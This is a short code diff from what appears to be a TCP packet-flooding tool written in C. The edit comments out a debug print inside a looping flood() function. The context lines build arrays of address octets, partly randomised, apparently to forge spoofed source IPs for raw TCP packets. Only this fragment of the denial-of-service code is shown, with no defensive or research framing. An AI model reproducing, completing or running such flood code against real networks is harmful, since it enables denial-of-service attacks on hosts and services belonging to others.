@@ -237,7 +237,10 @@ void *flood(void *par1)
         while (1)
         {
 
+                /*
+                Debug for packet size DOFF, ignore
                 printf("Size of tcphdr: %zu", sizeof(struct tcphdr) + sizeof(struct tcpopts));
+                */
                 uint8_t first_octet_options[16] = {151, 188, 37, 51, 176, 5, 92, 172, 8, 198, 192, 155, 140, 144, 55, 132};
                 uint8_t second_octet_options[16] = {80, 165, 187, 89, 31, 196, 222, 64, 46, 41, 112, 155, 1, 170, 0, 128};
                 uint8_t third_octet_options[8] = {1, randnum(0, 255), 255, 113, 0, 36, 128, 192};
